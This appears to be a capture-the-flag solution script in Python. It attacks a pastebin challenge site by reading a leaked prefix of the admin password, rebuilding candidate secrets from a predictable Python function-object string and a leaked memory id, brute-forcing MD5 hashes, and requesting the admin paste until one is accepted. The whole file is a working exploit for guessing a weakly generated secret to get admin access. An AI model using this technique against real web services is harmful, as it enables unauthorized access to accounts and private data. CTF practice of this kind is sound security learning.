import requests
from hashlib import md5
from tqdm import trange

url = "https://pastebin.web.actf.co"

def crack_password(pass_start, id):
    for i in trange(256**3):
        for j in range(0, 256, 16):
            str = f"password-<function token_hex at {id}{i:x}{j:x}>"
            hash = md5(str.encode()).hexdigest()
            if hash.startswith(pass_start):
                print(f"Potential password: {hash}")
                response = requests.get(f"{url}/view?id=0&password={hash}")
                if "Incorrect" not in response.text:
                    print(response.text)
                    return

if __name__ == "__main__":
    # Get id
    response = requests.post(f"{url}/paste", data={"content": "nils"})
    id = response.text.split("id=")[1].split('"')[0]
    id = hex(int(id))[:6]
    # Get admin password[:6]
    response = requests.get(f"{url}/view?id=0")
    pass_start = response.text.split("=")[1].split(".")[0]
    # Crack pass
    crack_password(pass_start, id)